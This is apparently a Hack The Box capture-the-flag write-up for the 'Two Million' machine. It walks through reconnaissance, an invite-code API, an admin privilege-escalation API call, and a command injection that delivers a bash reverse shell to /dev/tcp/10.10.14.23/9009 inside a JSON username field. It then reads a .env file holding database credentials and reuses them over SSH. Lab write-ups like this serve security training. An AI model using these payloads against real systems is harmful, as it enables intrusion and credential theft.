# Hack the Box - Two Million

```shell
rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.221 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 04:32 EDT
Initiating Parallel DNS resolution of 1 host. at 04:32
Completed Parallel DNS resolution of 1 host. at 04:32, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:32
Scanning 10.10.11.221 [2 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
Completed Connect Scan at 04:32, 0.18s elapsed (2 total ports)
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.19s latency).
Scanned at 2023-10-10 04:32:22 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```shell
rustscan -u 5000 -p 22,80 -a 10.10.11.221 -- -Pn -sCV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 04:34 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:34
Completed Parallel DNS resolution of 1 host. at 04:34, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:34
Scanning 10.10.11.221 [2 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed Connect Scan at 04:34, 0.20s elapsed (2 total ports)
Initiating Service scan at 04:34
Scanning 2 services on 10.10.11.221
Completed Service scan at 04:34, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 5.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.19s latency).
Scanned at 2023-10-10 04:34:22 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:34
Completed NSE at 04:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```
```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://2million.htb -H 'Host: FUZZ.2million.htb' -mc 200
```
```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.2million.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 139 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ef99e9a-bc56-47c0-8bf3-7181152fe9fb)

```shell
feroxbuster -u http://2million.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --no-recursion --dont-extract-links --status-codes 200
```
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       94l      293w     4527c http://2million.htb/register
200      GET       80l      232w     3704c http://2million.htb/login
200      GET     1242l     3326w    64952c http://2million.htb/
200      GET       46l      152w     1674c http://2million.htb/404
200      GET       96l      285w     3859c http://2million.htb/invite
[####################] - 2m     26584/26584   0s      found:5       errors:0      
[####################] - 2m     26584/26584   249/s   http://2million.htb/ 
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22f029f5-2c93-4b03-9de0-3c684d5401cd)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5e6f1090-1cf2-4ea3-935f-8f88533a0ebe)

Obfuscated:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bee450a0-fc56-4811-8c53-8948c7ccad21)

Deobfuscated:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7b6186a-dcca-4445-8bd0-236d7cbe4e77)

Curl:
```shell
> curl -vvv -X POST http://2million.htb/api/v1/invite/how/to/generate \
>
* processing: http://2million.htb/api/v1/invite/how/to/generate
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1/invite/how/to/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> 
< HTTP/1.1 405 Method Not Allowed
< Server: nginx
< Date: Wed, 11 Oct 2023 03:48:47 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=icm6l9ofqbmqc97pfvsngse3k0; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
> curl -vvv http://2million.htb/api/v1/invite/how/to/generate \
> -X POST
* processing: http://2million.htb/api/v1/invite/how/to/generate
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> POST /api/v1/invite/how/to/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 11 Oct 2023 03:49:43 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=bcuos6e1in30m1038kev7hb1be; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%   
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/37013924-a0ab-44a4-b859-b049ac019857)

Decrypt ROT13
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8d5a8313-fa55-4bc9-ac5c-8e06826dc9c0)

Curl
```shell
> curl -vvv -X POST http://2million.htb/api/v1/invite/generate \
> 
* processing: http://2million.htb/api/v1/invite/generate
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> POST /api/v1/invite/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 11 Oct 2023 03:58:04 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=djoq35l0e1qmtpfg7ro1gef91e; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"0":200,"success":1,"data":{"code":"NktMQlMtM01GSU4tT1pRVUYtTzZDM1o=","format":"encoded"}}% 
```

Base64 Decode
```shell
> echo "NktMQlMtM01GSU4tT1pRVUYtTzZDM1o=" | base64 -d
6KLBS-3MFIN-OZQUF-O6C3Z%
```

Register
```shell
http://2million.htb/invite
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3d225e76-2d0a-41a6-8d0e-5f6c792ddee0)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8bdaef19-dff6-4fb9-8fbe-84262249fee2)

Login
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dfda5f9d-2ee7-4804-bb13-cc0e69c0f0d5)

Dashboard
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c5534874-fd6b-4bbf-ba45-d75e259166fd)

API Routes
```shell
> curl -vvv http://2million.htb/api/v1 -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" | jq
* processing: http://2million.htb/api/v1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 11 Oct 2023 04:18:54 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [812 bytes data]
100   800    0   800    0     0   4111      0 --:--:-- --:--:-- --:--:--  4494
* Connection #0 to host 2million.htb left intact
{
  "v1": {                                                                                                                                      
    "user": {                                                                                                                                  
      "GET": {                                                                                                                                 
        "/api/v1": "Route List",                                                                                                               
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",                                                            
        "/api/v1/invite/generate": "Generate invite code",                                                                                     
        "/api/v1/invite/verify": "Verify invite code",                                                                                         
        "/api/v1/user/auth": "Check if user is authenticated",                                                                                 
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",                                                                       
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",                                                                         
        "/api/v1/user/vpn/download": "Download OVPN file"                                                                                      
      },                                                                                                                                       
      "POST": {                                                                                                                                
        "/api/v1/user/register": "Register a new user",                                                                                        
        "/api/v1/user/login": "Login with existing user"                                                                                       
      }                                                                                                                                        
    },                                                                                                                                         
    "admin": {                                                                                                                                 
      "GET": {                                                                                                                                 
        "/api/v1/admin/auth": "Check if user is admin"                                                                                         
      },                                                                                                                                       
      "POST": {                                                                                                                                
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"                                                                         
      },                                                                                                                                       
      "PUT": {                                                                                                                                 
        "/api/v1/admin/settings/update": "Update user settings"                                                                                
      }                                                                                                                                        
    }                                                                                                                                          
  }                                                                                                                                            
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0a5d775c-6d54-4420-a378-4cddbdb99ac5)


```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ea64fd6f-fc38-4d78-b85c-3be08efe7c51)

```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/76649027-b14f-4208-88a4-c286f10a4970)

```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9e4b484-aec8-42a5-9ea2-456073f1671c)

```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":""}' | jq
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5fa4a6cc-4df6-41b0-8dec-5ce4c21de908)

```shell
> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":1}' | jq
{
  "id": 13,
  "username": "attacker",
  "is_admin": 1
}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5366cdd3-3806-4c4e-ad45-b518cb9fe6ca)

```shell
> curl -vvv http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json"
* processing: http://2million.htb/api/v1/admin/auth
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1/admin/auth HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.2.1
> Accept: */*
> Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj
> Content-Type: application/json
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 11 Oct 2023 05:02:45 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"message":true}%                    
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a2be69ef-34a1-4ef2-9c98-c504adb77a6e)

Exporing the Dashboard
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/64be9cc8-6272-44bc-be1a-3ea14573ae81)

Generate VPN
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5ab784e2-8771-4c2e-ac87-01fffa9a42fd)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb1aa693-073f-4fa9-8da3-a3b438d00deb)

```shell
> curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json"
{"status":"danger","message":"Missing parameter: username"}%                                                                                   
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ca647c15-72b2-41db-8c05-f9c8cf7e1ce1)

```shell
> curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"username":"attacker"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
<-- SNIP -->
```

Moving to BurpSuite
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b30f9d8d-de64-45f0-ba04-be6b5f03d317)

Command Injection
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/29ed97e5-d0dc-4da1-92cc-75f7545f759c)
The response is returned after a delay of 5 seconds, hence command injection exists.

Reverse Shell
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ca2d3e6-b0af-4f58-a753-861e7917f895)
```json
{ "username":"attacker$(bash -c 'bash -i >& /dev/tcp/10.10.14.23/9009 0>&1')"}
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ba3b4c95-4eaa-4d05-b40a-ad90c2071449)

Shell Upgrade
```shell
www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bec35870-0a36-4190-af0f-469245a9b7c5)

Environment File
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4a8741ed-abf9-4f05-947d-f2dd87c3a01b)

```shell
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

SSH as Admin
```shell
> ssh admin@10.10.11.221
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ebcb43a4-e951-43f1-b9a3-683ad93da8f3)

